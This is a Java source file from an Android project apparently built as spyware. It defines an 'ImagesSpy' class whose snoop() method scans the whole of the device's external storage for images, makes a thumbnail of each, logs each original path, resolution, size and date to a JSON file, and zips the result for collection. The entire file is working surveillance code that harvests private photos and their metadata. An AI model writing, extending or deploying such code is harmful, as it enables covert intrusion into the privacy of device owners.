package com.gameofcoding.spy.spys;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.ZipUtils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.DecimalFormat;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import org.json.JSONArray;
import org.json.JSONException;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.ExecutorService;
import org.json.JSONObject;

public class ImagesSpy implements Spy {
    private final String TAG = "ImagesSpy";
    public static final String IMAGES_DIR_NAME = "images";
    public static final String IMAGES_PROPS_FILE_NAME = "images.json";
    public static final String IMAGES_ZIP_FILE_NAME = "images.zip";
    private final ExecutorService mExecutor = Executors.newCachedThreadPool();
    private final List<Future<?>> mExecFutures = new ArrayList<Future<?>>();
    public static File mExcepDirs[];
    private File mDestDir;
    private final File ROOT_DIR = Environment.getExternalStorageDirectory();
    private final JSONArray imagesProps = new JSONArray();

    public ImagesSpy(Context context, File destDir) {
	mDestDir = destDir;
	if(!mDestDir.exists())
	    mDestDir.mkdirs();
	final File androidFolder = new File(ROOT_DIR, "Android");
	File sickboyDir = new File(ROOT_DIR, "SickBoyDir");
	File appProject = new File(ROOT_DIR, "AppProjects");
	File whatsApp = new File(ROOT_DIR, "WhatsApp");
	mExcepDirs = new File[] {
	    destDir,
	    androidFolder,
	    appProject,
	    sickboyDir,
	    whatsApp
	};
    }

    @Override
    public void snoop() {
	scanDir(ROOT_DIR, mDestDir);
	try {
	    try {
		for(Future<?> execFuture : mExecFutures)
		    execFuture.get();
	    } catch(ExecutionException e) {
		XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
	    } catch(InterruptedException e){
		XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
	    }
	    // Zip scanned files
	    XLog.i(TAG, "Zipping images...");
	    ZipUtils zipUtils = new ZipUtils();
	    File[] filesToZip  = mDestDir.listFiles();
	    File zipDestDir = new File(mDestDir, IMAGES_ZIP_FILE_NAME);
	    zipUtils.zip(filesToZip, zipDestDir);
	    XLog.i(TAG, "Deleting zipped images");
	    for(File file : filesToZip) {
		if(!file.delete())
		    XLog.i(TAG, "Could'nt delete images, file=" + file);
	    }
	    XLog.i(TAG, "Zipped and deleted (zipped images)");
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred while zipping scanned images", e);
	}
	try {
	    FileUtils.write(new File(mDestDir, IMAGES_PROPS_FILE_NAME), imagesProps.toString());
	} catch(IOException e) {
	    XLog.e(TAG, "snoop(): Error occurred while saving image props.", e);
	}
    }

    private void scanDir(final File directory, final File destDir) {
	if (directory.isDirectory()) {
	    // Return if directory is not to be scanned
	    for(File exceptFile : mExcepDirs) {
		if(directory.toString().equals(exceptFile.toString())) {
		    XLog.v(TAG, "scanDir(File): skipping dir, directory=" + directory);
		    return;
		}
	    }
	    //	    XLog.v(TAG, "Scanning Dir: " + directory.toString());
	    for (final File file : directory.listFiles()) {
		if (file.isDirectory()) {
		    scanDir(file, destDir);
		}
		else {
		    if (isImage(file)) {
			// Generate new file for storing compressed image
			File destFile = new File(mDestDir, file.getName());
			int suffix = 1;
			while(destFile.exists()) {
			    String newFileName = file.getName();
			    String fileSuffix = "(" + suffix++ + ")";
			    if(newFileName.contains(".")) {
				// e.g test.txt > test(n).txt
				newFileName = newFileName.substring(0, newFileName.lastIndexOf("."))
				    + fileSuffix
				    + newFileName.substring(newFileName.lastIndexOf("."), newFileName.length());;
			    } else {
				// e.g text > text(n)
				newFileName += fileSuffix;
			    }
			    destFile = new File(mDestDir, newFileName);
			}

			try {
			    if(!destFile.createNewFile()) {
				XLog.e(TAG, "Could'nt create file, file=" + destFile + ", skipping image");
				continue;
			    }
			} catch(IOException e) {
			    XLog.e(TAG, "Failed to create dest. file, destFile=" + destFile, e);
			    continue;
			}
			final File tempDestFile = destFile;
			// File is an image, compress and store it
			Future<?> execFuture  = mExecutor.submit(new Runnable() {
				@Override
				public void run() {
				    if(!handleImageProcessing(file, tempDestFile))
					tempDestFile.delete();
				}
			    });
			mExecFutures.add(execFuture);
		    }
		}
	    }
	} else {
	    if(directory.isFile())
		XLog.e(TAG, "scanDir(File): file="+directory+", is a file!");
	    else if(!directory.exists())
		XLog.e(TAG, "scanDir(File): file="+directory+", does not exist!");
	    else
		XLog.e(TAG, "scanDir(File): file="+directory+", could not be loaded!");
	}
    }

    private boolean handleImageProcessing(File sourceFile, File destFile) {
	Bitmap compressedImage = compressImage(sourceFile.toString());
	if(compressedImage == null)
	    return false;

	// Save details about image in json properties file
	Bitmap bitmapImage = BitmapFactory.decodeFile(sourceFile.toString());
	if(bitmapImage == null)
	    return false;
	String imagePath = sourceFile.toString();
	String actualResolution =
	    bitmapImage.getWidth() + "x" + bitmapImage.getHeight();
	String compressedResolution =
	    compressedImage.getWidth() + "x" + compressedImage.getHeight();
	if(actualResolution.equals(compressedResolution))
	    compressedResolution = "UNCOMPRESSED";
	String readableSize = readableFileSize(sourceFile.length());
	String lastModified = new Date(sourceFile.lastModified()).toString();
	try {
	    JSONObject image = new JSONObject();
	    image.put("Path: ", imagePath);
	    image.put("New Name: ", destFile.getName());
	    image.put("Resol.: ", actualResolution);
	    image.put("Comp. Resol.: ", compressedResolution);
	    image.put("Size: ", readableSize);
	    image.put("Modified: ", lastModified);
	    imagesProps.put(image);
	} catch(JSONException e) {
	    XLog.e(TAG, "Exception occured while saving image props.", e);
	}
	// Finally store compressed image
	storeImage(compressedImage, destFile);
	return true;
    }

    private boolean isImage(File file) {
	if (file == null || !file.exists())
	    return false;
	BitmapFactory.Options options = new BitmapFactory.Options();
	options.inJustDecodeBounds = true;
	BitmapFactory.decodeFile(file.toString(), options);
	return (options.outWidth > 0 && options.outHeight > 0);
    }
    
    private String readableFileSize(long size) {
	if(size <= 0) return "0";
	String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
	int digitGroups = (int) (Math.log10(size)/Math.log10(1024));
	return new DecimalFormat("#,##0.#").format(size/Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    private Bitmap compressImage(String path) {
	Bitmap bitmapImage = BitmapFactory.decodeFile(path);
	if(bitmapImage == null) {
	    XLog.w(TAG, "compressImage(String): Could not compress image, PATH=" + path);
	    return null;
	}

	if(bitmapImage.getWidth() < 45 || bitmapImage.getHeight() < 70) {
	    XLog.v(TAG, "Image, '" + path + "' is too small to be compressed!");
	    return bitmapImage;
	}

	// Make image 45px wide and ratio according to that
	int newWidth = 45;
	int newHeight = (int) (bitmapImage.getHeight() * (40.0 / bitmapImage.getWidth()));
	//XLog.v(TAG, "Compressing image, path=" + path + ", newWidth " + newWidth + ", newHeight " + newHeight);
	Bitmap scaled = Bitmap.createScaledBitmap(bitmapImage, newWidth, newHeight, true);
	return scaled;
    }

    private void storeImage(Bitmap image, File destFile) {
	if(image == null || destFile == null)
	    return;
	//XLog.v(TAG, "Storing image: to=" + destFile);
	try {
	    FileOutputStream fos = new FileOutputStream(destFile);
	    image.compress(Bitmap.CompressFormat.PNG, 100, fos);
	    fos.close();
	} catch (IOException e) {
	    XLog.e(TAG, "Error occurred while storing image", e);
	}
    }

}
